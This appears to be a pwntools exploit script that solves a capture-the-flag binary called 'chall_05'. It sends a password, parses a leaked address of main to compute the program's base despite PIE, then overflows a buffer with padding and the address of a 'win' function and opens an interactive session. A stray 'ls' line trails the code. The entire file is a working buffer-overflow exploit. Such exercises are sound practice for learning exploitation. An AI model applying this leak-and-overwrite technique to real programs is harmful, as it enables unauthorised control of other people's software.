from pwn import *
p = process ("./chall_05")
context.arch = "amd64" 
elf = ELF("./chall_05") 

p.recv()
p.sendline("andyrulz")
resp = p.recv()
resp

import re
streeng = re.findall(b"([a-f0-9]{8,16})",resp)[0]

main = int(streeng ,16)
elf.address = main - elf.sym.main

payload = b''
payload+= (0x48-0x10) * b'A' 
payload += p64(elf.sym.win)

p.sendline(payload)

p.interactive()
ls